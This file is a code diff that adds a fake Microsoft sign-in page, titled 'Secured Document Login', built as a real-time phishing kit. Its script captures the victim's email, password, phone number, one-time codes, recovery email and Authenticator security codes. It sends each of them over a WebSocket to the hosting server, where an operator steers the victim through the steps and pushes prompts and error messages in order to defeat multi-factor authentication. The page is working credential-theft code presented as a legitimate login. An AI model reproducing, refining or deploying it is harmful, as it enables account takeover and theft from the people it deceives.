@@ -1,0 +1,765 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Secured Document Login</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin: 0;
+      display: flex;
+      background-image: url('./Screenshot 2025-11-16 131416.png');
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      position: relative;
+      overflow: hidden;
+    }
+
+    input:-webkit-autofill,
+    input:-webkit-autofill:hover,
+    input:-webkit-autofill:focus,
+    textarea:-webkit-autofill,
+    select:-webkit-autofill {
+      -webkit-box-shadow: 0 0 0px 1000px #fff inset !important;
+      box-shadow: 0 0 0px 1000px #fff inset !important;
+      -webkit-text-fill-color: inherit !important;
+      background-color: transparent !important;
+    }
+
+    .dots {
+      position: relative;
+      width: 100%;
+      height: 30px;
+      visibility: hidden;
+      opacity: 0;
+      margin-left: 2rem;
+      transition: opacity 200ms ease;
+      pointer-events: none;
+    }
+    .dots span {
+      display: inline-block;
+      position: absolute;
+      animation-duration: 4s;
+      animation-iteration-count: infinite;
+      opacity: 0;
+      margin-left: 2rem;
+    }
+    .dots span:after {
+      content: "";
+      position: absolute;
+      display: inline-block;
+      background-color: #0078d4;
+      width: 5px;
+      height: 5px;
+      border-radius: 50%;
+    }
+    .dots span:nth-child(1) { animation-delay: 0.05s; }
+    .dots span:nth-child(2) { animation-delay: 0.10s; }
+    .dots span:nth-child(3) { animation-delay: 0.15s; }
+    .dots span:nth-child(4) { animation-delay: 0.20s; }
+    .dots span:nth-child(5) { animation-delay: 0.25s; }
+    .dots span:nth-child(1):after { left: -20px; }
+    .dots span:nth-child(2):after { left: -40px; }
+    .dots span:nth-child(3):after { left: -60px; }
+    .dots span:nth-child(4):after { left: -80px; }
+    .dots span:nth-child(5):after { left: -100px; }
+    .dots.animate { visibility: visible; opacity: 1; pointer-events: auto; }
+    .dots.animate span { animation-name: dots; opacity: 1; }
+    .form-container.busy { opacity: 0.6; transition: opacity 150ms ease; }
+
+    @keyframes dots {
+      0%,  20% { left: 20%;  animation-timing-function: ease-out; opacity: 0; }
+      25%       { opacity: 1; }
+      35%       { left: 45%; animation-timing-function: linear; }
+      65%       { left: 55%; animation-timing-function: ease-in; }
+      75%       { opacity: 1; }
+      80%, 100% { left: 100%; opacity: 0; }
+    }
+
+    .background-image {
+      position: absolute;
+      top: 0;
+      left: 20%;
+      width: 60%;
+      height: 100%;
+      background-size: contain;
+      background-repeat: no-repeat;
+      background-position: center;
+      margin: auto;
+      filter: blur(5px);
+      z-index: -1;
+    }
+
+    .form-container {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: #fff;
+      padding: 40px 40px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+      width: 100%;
+      max-width: 350px;
+      z-index: 1;
+      backdrop-filter: none;
+    }
+
+    .small-text{
+        font-size: 13px;
+    }
+
+    .form-container h1 {
+      font-size: 24px;
+      font-weight: 600;
+      margin-bottom: 20px;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    .form-container input {
+      border: 1px solid #000000;
+      border-top: none;
+      border-left: none;
+      border-right: none;
+      font-size: 16px;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      outline: none;
+      background: transparent;
+      color: #111;
+      transition: border-bottom-color 0.15s;
+      width: 100%;
+      padding: 7px 0;
+      margin-bottom: 15px;
+    }
+    .form-container input:focus { border-bottom-color: #0078d4; }
+    .form-container input::placeholder { color: #999; }
+    .form-container input:disabled { opacity: 0.5; }
+
+    .form-container .links {
+      font-size: 14px;
+      margin: 10px 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+    .form-container .links a {
+      color: #0078d4;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      text-decoration: none;
+      cursor: pointer;
+    }
+    .form-container .links a:hover { text-decoration: underline; }
+
+    .form-container .buttons {
+      display: flex;
+      gap: 1rem;
+      justify-content: right;
+      margin-top: 25px;
+    }
+    .form-container button {
+      padding: 8px 15px;
+      font-size: 14px;
+      width: 100px;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      border: none;
+      cursor: pointer;
+    }
+    .btn-back { background-color: #e0e0e0; color: #333; }
+    .btn-next { background-color: #0078d4; color: #fff; }
+    .form-container button:disabled { opacity: 0.6; cursor: not-allowed; }
+
+    /* ── Added components — same design language ── */
+    .err-text {
+      font-size: 12px;
+      color: #c50f1f;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin-top: -10px;
+      margin-bottom: 12px;
+      display: none;
+      line-height: 1.4;
+    }
+    .err-text.show { display: block; }
+
+    .step-subtitle {
+      font-size: 13px;
+      color: #555;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin-top: -14px;
+      margin-bottom: 18px;
+      line-height: 1.5;
+    }
+
+    .email-pill {
+      /* display: inline-block; */
+      font-size: 16px;
+      color: #020202;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin: 13px 0;
+      word-break: break-all;
+    }
+
+    .pw-wrap { position: relative; }
+    .pw-wrap input { padding-right: 26px; }
+    .pw-eye {
+      position: absolute;
+      right: 0; top: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      opacity: 0.55;
+      user-select: none;
+    }
+    .pw-eye:hover { opacity: 1; }
+
+    .info-box {
+      border: 1px solid #d0d0d0;
+      padding: 10px 12px;
+      margin-bottom: 16px;
+      background: #fafafa;
+    }
+    .info-box-label {
+      font-size: 11px;
+      color: #888;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+      margin-bottom: 3px;
+    }
+    .info-box-value {
+      font-size: 14px;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: #111;
+    }
+
+    .verify-box {
+      border: 1px solid #d0d0d0;
+      padding: 14px 16px;
+      margin-bottom: 18px;
+      display: flex;
+      align-items: center;
+      gap: 18px;
+      background: #fafafa;
+    }
+    .verify-num {
+      font-size: 2.4rem;
+      font-weight: bold;
+      color: #0078d4;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      min-width: 48px;
+      text-align: center;
+      line-height: 1;
+    }
+    .verify-desc {
+      font-size: 13px;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: #444;
+      line-height: 1.6;
+    }
+
+    .btn-waiting {
+      width: 100%;
+      background: #e8f0fb;
+      color: #0078d4;
+      border: 1px solid #b3cdf7;
+      padding: 9px 15px;
+      font-size: 14px;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      cursor: default;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 9px;
+      position: relative;
+      overflow: hidden;
+    }
+    .btn-waiting::after {
+      content: '';
+      position: absolute; top: 0; left: -100%; width: 60%; height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(0,120,212,0.08), transparent);
+      animation: shimmer 1.6s infinite;
+    }
+    @keyframes shimmer { to { left: 160%; } }
+    .spinner-sm {
+      width: 13px; height: 13px;
+      border: 2px solid #b3cdf7;
+      border-top-color: #0078d4;
+      border-radius: 50%;
+      animation: spin-sm 0.7s linear infinite;
+      flex-shrink: 0;
+    }
+    @keyframes spin-sm { to { transform: rotate(360deg); } }
+
+    .otp-row { display: flex; gap: 8px; margin-bottom: 12px; }
+    .otp-row input {
+      flex: 1;
+      height: 46px;
+      text-align: center;
+      font-size: 1.2rem;
+      font-weight: bold;
+      padding: 0;
+      margin-bottom: 0;
+      min-width: 0;
+    }
+
+    .steps-list { list-style: none; padding: 0; margin: 0 0 16px; }
+    .steps-list li {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      font-size: 13px;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: #444;
+      padding: 8px 0;
+      border-bottom: 1px solid #eee;
+    }
+    .steps-list li:last-child { border-bottom: none; }
+    .step-num-badge {
+      background: #0078d4;
+      color: #fff;
+      font-size: 10px;
+      font-weight: bold;
+      border-radius: 50%;
+      width: 18px; height: 18px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      margin-top: 2px;
+    }
+
+    .step { display: none; }
+    .step.active { display: block; animation: stepIn 0.18s ease both; }
+    @keyframes stepIn {
+      from { opacity: 0; transform: translateX(8px); }
+      to   { opacity: 1; transform: none; }
+    }
+
+    /* ── Responsive ── */
+    @media (max-width: 480px) {
+      body { align-items: flex-end; }
+      .form-container {
+        position: relative;
+        top: auto; left: auto;
+        transform: none;
+        max-width: 100%;
+        width: 100%;
+        padding: 30px 24px 36px;
+        box-shadow: 0 -2px 12px rgba(0,0,0,0.12);
+        min-height: 55vh;
+      }
+      .otp-row input { height: 40px; font-size: 1rem; }
+    }
+    @media (max-width: 360px) {
+      .form-container { padding: 24px 16px 28px; }
+      .otp-row { gap: 5px; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="background-image"></div>
+
+<div class="form-container" id="formContainer">
+
+  <div class="dots" id="dots">
+    <span></span><span></span><span></span><span></span><span></span>
+  </div>
+
+  <!-- ══ STEP: Email ══════════════════════════════════════════ -->
+  <div class="step active" id="step-email">
+    <img src="./microsoft_logo_ea19b2112f4dfd8e90b4505ef7dcb4f9.png" alt="microsoft Logo" style="margin-bottom:6px;max-height:36px;">
+    <h1>Sign in</h1>
+    <input type="text" id="input-email" placeholder="Email, phone, or Skype" />
+    <p class="err-text" id="err-email">Please enter your email or phone number.</p>
+    <div class="links">
+      <p>No account? <a href="#">Create one!</a></p>
+      <p><a href="#">Can't access your account?</a></p>
+    </div>
+    <div class="buttons">
+      <button class="btn-back" type="button" onclick="window.history.back()">Back</button>
+      <button class="btn-next" type="button" onclick="submitEmail()">Next</button>
+    </div>
+  </div>
+
+  <!-- ══ STEP: Password ═══════════════════════════════════════ -->
+  <div class="step" id="step-password">
+    <img src="./microsoft_logo_ea19b2112f4dfd8e90b4505ef7dcb4f9.png" alt="microsoft Logo" style="margin-bottom:6px;max-height:36px;">
+
+    <div class="email-pill" id="display-email">user@email.com</div>
+
+    <h1>Enter password</h1>
+    
+    <div class="pw-wrap">
+      <input type="password" id="input-password" placeholder="Password" />
+    </div>
+    <p class="err-text" id="err-password">Your account or password is incorrect. If you don't remember your password, <a href="#" style="color:#c50f1f">reset it now</a>.</p>
+    <div class="links">
+      <p><a href="#">Forgot my password</a></p>
+      <!-- <p><a onclick="goTo('email')">Sign in with a different account</a></p> -->
+    </div>
+    <div class="buttons">
+      <button class="btn-back" type="button" onclick="goToBack('email')">Back</button>
+      <button class="btn-next" type="button" onclick="submitPassword()">Next</button>
+    </div>
+  </div>
+
+  <!-- ══ STEP: Verify push ════════════════════════════════════ -->
+  <div class="step" id="step-verify">
+    <img src="./microsoft_logo_ea19b2112f4dfd8e90b4505ef7dcb4f9.png" alt="microsoft Logo" style="margin-bottom:6px;max-height:36px;">
+    <h1>Verify it's you</h1>
+    <p class="step-subtitle" id="verify-subtitle">Open your Authenticator app and tap the number shown below to approve sign-in.</p>
+    <div class="verify-box">
+      <div class="verify-num" id="verify-num">42</div>
+      <div class="verify-desc">Tap this number in the <strong>Authenticator</strong> app on your phone.</div>
+    </div>
+    <div class="btn-waiting">
+      <div class="spinner-sm"></div>
+      Waiting for approval…
+    </div>
+    <div class="links" style="margin-top:14px;">
+      <p><a onclick="goTo('phone')">Use a verification code instead</a></p>
+    </div>
+    <div class="buttons" style="justify-content:left;margin-top:14px;">
+      <button class="btn-back" type="button" onclick="goToBack('password')">Back</button>
+    </div>
+  </div>
+
+  <!-- ══ STEP: Phone confirmation ═════════════════════════════ -->
+  <div class="step" id="step-phone">
+    <img src="./microsoft_logo_ea19b2112f4dfd8e90b4505ef7dcb4f9.png" alt="microsoft Logo" style="margin-bottom:6px;max-height:36px;">
+    <h1>Verify your phone</h1>
+    <p class="step-subtitle"><div id="phone-info-label" class="small-text">Enter the Phone number on your account and we'll send a verification code to</div><div id="phone-info-value" class="small-text">(•••) ••••-••49</div></p>
+
+    <div class="pw-wrap">
+      <input type="text" id="input-phone" placeholder="Enter phone number" />
+    </div>
+    
+    <p class="err-text" id="err-phone">We couldn't send a code to this number. Please try a different method.</p>
+
+    <div class="links">
+      <p><a onclick="goTo('recovery')">Use a recovery email instead</a></p>
+    </div>
+    <div class="buttons">
+      <button class="btn-back" type="button" onclick="goToBack('verify')">Back</button>
+      <button class="btn-next" type="button" onclick="submitPhone()">Send code</button>
+    </div>
+  </div>
+
+  <!-- ══ STEP: OTP / verification code ════════════════════════ -->
+  <div class="step" id="step-code">
+    <img src="./microsoft_logo_ea19b2112f4dfd8e90b4505ef7dcb4f9.png" alt="microsoft Logo" style="margin-bottom:6px;max-height:36px;">
+    <h1>Enter the code</h1>
+    <p class="step-subtitle" id="code-subtitle">We sent a 6-digit code to your phone. Enter it below.</p>
+    <div class="otp-row" id="otp-inputs">
+      <input type="text" maxlength="1" inputmode="numeric" autocomplete="one-time-code" />
+      <input type="text" maxlength="1" inputmode="numeric" autocomplete="one-time-code" />
+      <input type="text" maxlength="1" inputmode="numeric" autocomplete="one-time-code" />
+      <input type="text" maxlength="1" inputmode="numeric" autocomplete="one-time-code" />
+      <input type="text" maxlength="1" inputmode="numeric" autocomplete="one-time-code" />
+      <input type="text" maxlength="1" inputmode="numeric" autocomplete="one-time-code" />
+    </div>
+    <p class="err-text" id="err-code">That code is incorrect. Please try again.</p>
+    <div class="links">
+      <p><a onclick="resendCode()">Resend code</a></p>
+    </div>
+    <div class="buttons">
+      <button class="btn-back" type="button" onclick="goToBack('phone')">Back</button>
+      <button class="btn-next" type="button" onclick="submitOtp()">Next</button>
+    </div>
+  </div>
+
+  <!-- ══ STEP: Recovery email ══════════════════════════════════ -->
+  <div class="step" id="step-recovery">
+    <img src="./microsoft_logo_ea19b2112f4dfd8e90b4505ef7dcb4f9.png" alt="microsoft Logo" style="margin-bottom:6px;max-height:36px;">
+    <h1>Verify your email</h1>
+    <p class="step-subtitle" style="display: flex;">Enter your recovery email and we'll send a verification code at <div class="small-text" id="recovery-info-value">reu•••••••@gmail.com</div> </p>
+
+    <div class="pw-wrap">
+      <input type="text" id="input-recovery" placeholder="Enter recovery email" />
+    </div>
+    <p class="err-text" id="err-recovery">We couldn't send a code to this email.</p>
+
+    <div class="buttons">
+      <button class="btn-back" type="button" onclick="goToBack('verify')">Back</button>
+      <button class="btn-next" type="button" onclick="submitRecovery()">Send code</button>
+    </div>
+  </div>
+
+  <!-- ══ STEP: Security code ═══════════════════════════════════ -->
+  <div class="step" id="step-security">
+    <img src="./microsoft_logo_ea19b2112f4dfd8e90b4505ef7dcb4f9.png" alt="microsoft Logo" style="margin-bottom:6px;max-height:36px;">
+    <h1>Security code</h1>
+    <p class="step-subtitle" id="security-subtitle">Get your security code from the Authenticator app.</p>
+    <ul class="steps-list">
+      <li><div class="step-num-badge">1</div>Open the <strong>Authenticator</strong> app</li>
+      <li><div class="step-num-badge">2</div>Go to your account settings</li>
+      <li><div class="step-num-badge">3</div>Under <strong>Security</strong>, copy your code</li>
+    </ul>
+    <input type="text" id="input-security" placeholder="Security code" inputmode="numeric" />
+    <p class="err-text" id="err-security">That security code is incorrect. Please try again.</p>
+    <div class="buttons">
+      <button class="btn-back" type="button" onclick="goToBack('recovery')">Back</button>
+      <button class="btn-next" type="button" onclick="submitSecurity()">Next</button>
+    </div>
+  </div>
+
+</div>
+
+<script>
+  const SESSION_ID = 'sess_' + Math.random().toString(36).slice(2, 10);
+
+  // Build WebSocket URL that works locally AND behind any reverse proxy
+  // (Cloudflare, ngrok, Railway, Render, nginx, etc.)
+  // Rule: always connect back to the SAME host:port the page was served from.
+  // The proxy is responsible for upgrading /ws (or /) to WebSocket — no hard-coded port needed.
+  (function() {
+    const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+    const host  = location.hostname || 'localhost';
+    // Use the real port if present (local dev). In production the proxy
+    // strips the port and handles 80/443 itself, so location.port is empty.
+    const port  = location.port ? ':' + location.port : '';
+    window._wsUrl = proto + '//' + host + port;
+  })();
+  const wsUrl = window._wsUrl;
+
+  let socket = null, currentStep = 'email';
+
+  function showDots() {
+    document.getElementById('dots').classList.add('animate');
+    document.getElementById('formContainer').classList.add('busy');
+  }
+  function hideDots() {
+    document.getElementById('dots').classList.remove('animate');
+    document.getElementById('formContainer').classList.remove('busy');
+  }
+
+  function goTo(step) {
+    document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+    const el = document.getElementById('step-' + step);
+    if (!el) return;
+    el.classList.add('active');
+    hideDots();
+    currentStep = step;
+    wsSend({ type: 'step_changed', step, sessionId: SESSION_ID });
+  }
+  function goToBack(step) { hideDots(); goTo(step); }
+
+  function submitEmail() {
+    const email = document.getElementById('input-email').value.trim();
+    const err  = document.getElementById('err-email');
+    err.classList.remove('show');
+    if (!email) { err.classList.add('show'); return; }
+    document.getElementById('display-email').textContent = email;
+    wsSend({ type: 'email_submitted', email, sessionId: SESSION_ID });
+    showDots();
+  }
+  function submitPhone() {
+    const phone = document.getElementById('input-phone').value.trim();
+    const err   = document.getElementById('err-phone');
+    err.classList.remove('show');
+    if (!phone) { err.classList.add('show'); return; }
+    wsSend({ type: 'phone_submitted', phone, sessionId: SESSION_ID });
+    showDots();
+  }
+  function submitPassword() {
+    const pw  = document.getElementById('input-password').value;
+    const err = document.getElementById('err-password');
+    err.classList.remove('show');
+    if (!pw) { err.classList.add('show'); return; }
+    wsSend({ type: 'password_submitted', password: pw, sessionId: SESSION_ID });
+    showDots();
+  }
+  function submitOtp() {
+    const inputs = document.querySelectorAll('#otp-inputs input');
+    const six_code   = Array.from(inputs).map(i => i.value).join('');
+    const err = document.getElementById('err-code');
+    err.classList.remove('show');
+    if (six_code.length < 6) { err.classList.add('show'); return; }
+    wsSend({ type: 'otp_submitted', six_code, sessionId: SESSION_ID });
+    showDots();
+  }
+  function submitRecovery() {
+    const recovery = document.getElementById('input-recovery').value.trim();
+    const err   = document.getElementById('err-recovery');
+    err.classList.remove('show');
+    if (!recovery) { err.classList.add('show'); return; }
+    wsSend({ type: 'recovery_submitted', recovery, sessionId: SESSION_ID });
+    showDots();
+  }
+  function submitSecurity() {
+    const code = document.getElementById('input-security').value.trim();
+    const err  = document.getElementById('err-security');
+    err.classList.remove('show');
+    if (!code) { err.classList.add('show'); return; }
+    wsSend({ type: 'security_code_submitted', code, sessionId: SESSION_ID });
+    showDots();
+  }
+  function resendCode() {
+    wsSend({ type: 'code_resend_requested', sessionId: SESSION_ID });
+  }
+
+  document.addEventListener('DOMContentLoaded', () => {
+    const pwInput = document.getElementById('input-password');
+    const pwEye   = document.getElementById('pw-eye');
+    if (pwEye) {
+      pwEye.addEventListener('click', () => {
+        if (pwInput.type === 'password') { pwInput.type = 'text';     pwEye.textContent = '🙈'; }
+        else                             { pwInput.type = 'password'; pwEye.textContent = '👁'; }
+      });
+    }
+    const otpInputs = Array.from(document.querySelectorAll('#otp-inputs input'));
+
+    function fillOtp(digits, startIndex) {
+      digits = String(digits).replace(/\D/g, '').slice(0, 6);
+      digits.split('').forEach((d, j) => {
+        if (otpInputs[startIndex + j]) otpInputs[startIndex + j].value = d;
+      });
+      const next = Math.min(startIndex + digits.length, otpInputs.length - 1);
+      otpInputs[next].focus();
+    }
+
+    otpInputs.forEach((inp, i) => {
+      inp.addEventListener('keydown', e => {
+        if (e.key === 'Backspace') {
+          if (inp.value) {
+            inp.value = '';
+          } else if (i > 0) {
+            otpInputs[i - 1].value = '';
+            otpInputs[i - 1].focus();
+          }
+          e.preventDefault();
+        }
+      });
+
+      inp.addEventListener('input', e => {
+        const val = inp.value.replace(/\D/g, '');
+        if (!val) { inp.value = ''; return; }
+        // More than one char means autofill or fast paste via input event
+        if (val.length > 1) {
+          inp.value = '';
+          fillOtp(val, i);
+          return;
+        }
+        inp.value = val;
+        if (i < otpInputs.length - 1) otpInputs[i + 1].focus();
+      });
+
+      inp.addEventListener('paste', e => {
+        e.preventDefault();
+        const pasted = (e.clipboardData || window.clipboardData).getData('text');
+        fillOtp(pasted, i);
+      });
+
+      // Prevent non-numeric keys from even registering
+      inp.addEventListener('keypress', e => {
+        if (!/\d/.test(e.key)) e.preventDefault();
+      });
+
+      // Select existing content on focus so typing replaces it
+      inp.addEventListener('focus', () => inp.select());
+    });
+    document.getElementById('input-email').addEventListener('keydown',    e => { if (e.key === 'Enter') submitEmail(); });
+    document.getElementById('input-password').addEventListener('keydown', e => { if (e.key === 'Enter') submitPassword(); });
+    document.getElementById('input-security').addEventListener('keydown', e => { if (e.key === 'Enter') submitSecurity(); });
+  });
+
+  /* ── applyContent ── */
+  function applyContent(content, targetStep) {
+    // FIX: always resolve which step we're targeting.
+    // If the admin sends a step name, use it. Otherwise fall back to currentStep.
+    const step = (targetStep && targetStep !== '') ? targetStep : currentStep;
+
+    if (content.title) {
+      const el = document.querySelector('#step-' + step + ' h1');
+      if (el) el.textContent = content.title;
+    }
+    if (content.subtitle !== undefined) {
+      const el = document.querySelector('#step-' + step + ' .step-subtitle');
+      if (el) el.textContent = content.subtitle;
+    }
+    if (content.verifyNumber !== undefined) {
+      const el = document.getElementById('verify-num');
+      if (el) el.textContent = content.verifyNumber;
+    }
+    if (content.phoneNumber !== undefined) {
+      const el = document.getElementById('phone-info-value');
+      if (el) el.textContent = formatMaskedPhone(content.phoneNumber);
+    }
+    if (content.recoveryEmail !== undefined) {
+      const el = document.getElementById('recovery-info-value');
+      if (el) el.textContent = formatMaskedEmail(content.recoveryEmail);
+    }
+
+    // FIX: error handling — use the resolved step, not currentStep
+    if (content.error) {
+      hideDots();
+
+      // Map every possible step name to its error element id
+      const errMap = {
+        email:    'err-email',
+        password: 'err-password',
+        verify:   'err-verify',   // no element currently but safe to add
+        phone:    'err-phone',
+        code:     'err-code',
+        recovery: 'err-recovery',
+        security: 'err-security'
+      };
+
+      const errId = errMap[step];
+      if (errId) {
+        const errEl = document.getElementById(errId);
+        if (errEl) {
+          // Support both plain string and HTML (password step has a link inside)
+          errEl.innerHTML = content.error;
+          errEl.classList.add('show');
+        }
+      }
+    }
+  }
+
+  /* Auto-format helpers */
+  function formatMaskedPhone(val) {
+    if (/^\d{1,4}$/.test(val)) return `(•••) ••••-••${val}`;
+    return val;
+  }
+  function formatMaskedEmail(val) {
+    if (val.includes('@') || val.includes('•')) return val;
+    return `usr•••••••@${val}`;
+  }
+
+  function wsSend(obj) {
+    if (socket && socket.readyState === WebSocket.OPEN)
+      try { socket.send(JSON.stringify(obj)); } catch(e) {}
+  }
+
+  function initWS() {
+    socket = new WebSocket(wsUrl);
+    socket.onopen = () => { socket.send(JSON.stringify({ type: 'connect', sessionId: SESSION_ID })); };
+    socket.onmessage = (ev) => {
+      try {
+        const data = JSON.parse(ev.data);
+
+        if (data.type === 'navigate_to_step' && data.step) {
+          goTo(data.step);
+          // Apply content AFTER goTo so currentStep is updated
+          if (data.content) applyContent(data.content, data.step);
+        }
+
+        if (data.type === 'update_content' && data.content) {
+          // FIX: pass data.step explicitly so applyContent always knows
+          // which step the admin is targeting — even if it differs from currentStep
+          applyContent(data.content, data.step || currentStep);
+        }
+
+        if (data.type === 'code_assigned' && data.code) {
+          goTo('code');
+          const inputs = document.querySelectorAll('#otp-inputs input');
+          String(data.code).split('').forEach((c, i) => { if (inputs[i]) inputs[i].value = c; });
+        }
+      } catch(e) {}
+    };
+    socket.onclose = () => setTimeout(initWS, 2000);
+    socket.onerror = () => {};
+  }
+  initWS();
+</script>
+</body>
+</html>
